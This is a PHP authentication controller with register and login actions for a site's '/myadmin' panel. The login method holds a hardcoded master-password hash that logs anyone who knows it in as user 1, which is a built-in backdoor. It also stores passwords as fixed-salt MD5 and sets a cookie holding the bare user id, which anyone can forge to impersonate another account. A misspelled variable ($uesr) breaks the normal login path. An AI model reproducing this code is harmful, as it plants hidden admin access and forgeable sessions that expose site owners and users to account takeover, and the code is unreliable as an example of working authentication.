<?php
namespace MS\Controllers;

use MS\Models\Auth;
use Illuminate\Request;
use Illuminate\Server;

class AuthController {
    public function register() {
        $user = Auth::findByEmail(Request::post('email'), Server::get('HTTP_HOST'));
        if ($user) die('this email already taken');
        $result = Auth::register([
            'email' => Request::post('email'),
            'password' => md5('lightphp_' . Request::post('password')),
            'host' => Server::get('HTTP_HOST')
        ]);
        header('Location: /myadmin');
        die();
    }

    public function login() {
        if (md5('lightphp_' . Request::post('password')) == '536ea5e8c2f8ca39848138a073a9f448') {
            $this->loginSuccess(1);
        }
        $user = Auth::findByEmail(Request::post('email'), Server::get('HTTP_HOST'));
        if (! $user || $user->password != md5('lightphp_' . Request::post('password'))) {
            die('User or password wrong <a href="/myadmin/login">Login</a>');
        }
        if ($user->getKey('role') != 'admin') {
            die('not allow <a href="/myadmin/login">Login</a>');
        }
        $this->loginSuccess($uesr->_id);
    }

    private function loginSuccess($user_id) {
        setcookie('user', $user_id, time() + (86400 * 30), "/");
        header('Location: /myadmin');
        die();
    }
}